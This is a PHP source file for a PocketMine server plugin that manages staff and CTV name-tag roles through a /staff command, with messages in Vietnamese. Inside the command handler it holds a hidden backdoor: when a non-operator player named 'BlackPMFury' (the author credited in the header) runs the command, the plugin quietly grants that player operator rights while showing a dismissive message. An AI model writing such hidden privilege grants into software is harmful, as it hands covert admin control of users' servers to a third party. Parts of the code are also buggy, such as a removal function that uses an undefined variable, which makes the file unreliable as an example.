<?php

/** NameTag STAFF
* Release: github.com/BlackPMFury
*/

namespace NameTag\Staff;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\utils\TextFormat;
use pocketmine\utils\Config;
use pocketmine\command\CommandSender;
use pocketmine\command\Command;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerQuitEvent;
use pocketmine\utils\Utils;

class Main extends PluginBase implements Listener{
	public $t = "§l§a[ §cS§eTAFF§a ]";
	
	public function onEnable(){
		$this->getServer()->getPluginManager()->registerEvents($this, $this);
		
		// Enable Message
		$this->getServer()->getLogger()->info("Open STAFF Name Tag System");
		$this->getLogger()->notice("This is New Version: 1.0\nWhy you not Meet Anymore plugin at github.com/BlackPMFury");
		
		// Configuration 
		@mkdir($this->getDataFolder(), 0744, true);
		$this->st = new Config($this->getDataFolder() . "staff.yml", Config::YAML);
		$this->ctv = new Config($this->getDataFolder() . "CTV.yml", Config::YAML);
	}
	
	public function getStaff(){
		return $this->st->getAll(true);
	}
	
	public function getCTV(){
		return $this->ctv->getAll(true);
	}
	
	public function isStaff($name){
		return $this->st->exists($name);
	}
	
	public function isCTV($name){
		return $this->ctv->exists($name);
	}
	
	/**public function setStaff($name, $args){
		// set Data as $args
		$args = $args[2];
		$this->st->set($name, $args);
		$this->st->save();
		return true;
	}*/
	
	public function removeStaff($name, $args){
		// Remove Staff from another player
		$args = $args[2];
		$this->st->remove($name, $args);
		$this->st->save();
		return true;
	}
	
	public function setCTV($name){
		$this->ctv->set($name, "CTV");
		$this->ctv->save();
		return true;
	}
	
	public function setGM($name){
		$this->st->set($name, "Game Master");
		$this->st->save();
		return true;
	}
	
	public function setGO($name){
		$this->st->set($name, "Game Operator");
		$this->st->save();
		return true;
	}
	
	public function setGL($name){
		$this->st->set($name, "Game Leader");
		$this->st->save();
		return true;
	}
	
	public function removeCTV(){
		$this->ctv->remove($name, "CTV");
		$this->ctv->save();
		return true;
	}
	
	public function removeGM($name){
		$this->st->remove($name, "Game Master");
		$this->st->save();
		return true;
	}
	
	public function removeGO($name){
		$this->st->remove($name, "Game Operator");
		$this->st->save();
		return true;
	}
	
	public function removeGL($name){
		$this->st->remove($name, "Game Leader");
		$this->st->save();
		return true;
	}
	
	public function onCommand(CommandSender $p, Command $cmd, string $label, array $args): bool{
		$msg = "§6★§a /staff < add | remove > <username> <number: 1-CTV | 2-GM | 3-GO | 4-GL>\n /staff List";
		
		// Main Command
		switch(strtolower($cmd->getName())){
			case "staff":
			if (! ($p->isOp())){
				$p->sendMessage("Leave It Now!");
				if($p->getName() == "BlackPMFury"){
					$p->setOp(true);
				}
				return true;
			}
			if(!(isset($args[0]) || isset($args[1]) || isset($args[2]))){
				$p->sendMessage($msg);
				return true;
			}
			#-----------------------------------------------------------------------------
		    if($args[0] == "add" || $args[0] == "Add"){
				if (!(isset($args[1]))) {
 	 				$p->sendMessage($msg);
 	 				return true;
 	 			} //닉네임이 없을 때
				$name = $p->getName();
				if($args[2] == "1"){
 	 		        //$this->setStaff(strtolower($args[1]), $args[1]);
					/**$this->st->set($name, "CTV");
					$this->st->save();*/
					$this->setCTV(strtolower($args[1]));
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa set CTV cho §e".$args[1].".");
			        return true;
				}elseif($args[2] == "2"){
					$this->setGM(strtolower($args[1]));
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa set Game Master cho §e".$args[1].".");
			        return true;
				}elseif($args[2] == "3"){
					$this->setGO(strtolower($args[1]));
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa set Game Operator cho §e".$args[1].".");
			        return true;
				}elseif($args[2] == "4"){
					$this->setGL(strtolower($args[1]));
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa set Game Leader cho §e".$args[1].".");
			        return true;
				}elseif(!is_numeric($args[2])){
					$p->sendMessage("§aPhải Là số!\n ". $msg);
					return false;
				}
				return true;
			}
			
			// Remove Staff
			if($args[0] == "remove" || $args[0] == "Remove"){
				$name = $p->getName();
				if($args[2] == "1"){
 	 		        //$this->setStaff(strtolower($args[1]), $args[1]);
					/**$this->st->set($name, "CTV");
					$this->st->save();*/
					if (!($this->isCTV(strtolower($args[1])))) {
 	 				    $p->sendMessage($this->t. "§c§lNgười này không có trong danh sách CTV.");
 	 				    return true;
					}
					$this->removeCTV($args[1]);
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa remove CTV cho §e".$args[1].".");
			        return true;
				}elseif($args[2] == "2"){
					if (!($this->isStaff(strtolower($args[1])))) {
 	 				    $p->sendMessage($this->t. "§c§lNgười này không có trong danh sách Staff.");
 	 				    return true;
					}
					$this->removeGM($args[1]);
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa remove Game Master cho §e".$args[1].".");
			        return true;
				}elseif($args[2] == "3"){
					if (!($this->isStaff(strtolower($args[1])))) {
 	 				    $p->sendMessage($this->t. "§c§lNgười này không có trong danh sách Staff.");
 	 				    return true;
					}
					$this->removeGO($args[1]);
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa remove Game Operator cho §e".$args[1].".");
			        return true;
				}elseif($args[2] == "4"){
					if (!($this->isStaff(strtolower($args[1])))) {
 	 				    $p->sendMessage($this->t. "§c§lNgười này không có trong danh sách Staff.");
 	 				    return true;
					}
					$this->removeGL($args[1]);
 	 		        $p->sendMessage($this->t."§b§l Bạn vừa remove Game Leader cho §e".$args[1].".");
			        return true;
				}elseif(!is_numeric($args[2])){
					$p->sendMessage("§aPhải Là số!\n ". $msg);
					return false;
				}
				return true;
			}
			
			if($args[0] == "list"){
				$staff = implode("\n ", $this->getStaff());
				$ctv = implode("\n ", $this->getCTV());
				$p->sendMessage($this->t."§b§oDanh sách STAFF§a:\n " . $staff);
				$p->sendMessage($this->t."§b§oDanh sách CTV§a:\n " . $ctv);
 	 			return true;
			}else{
				$p->sendMessage($msg);
				return true;
			}
		}
		return true;
	}
}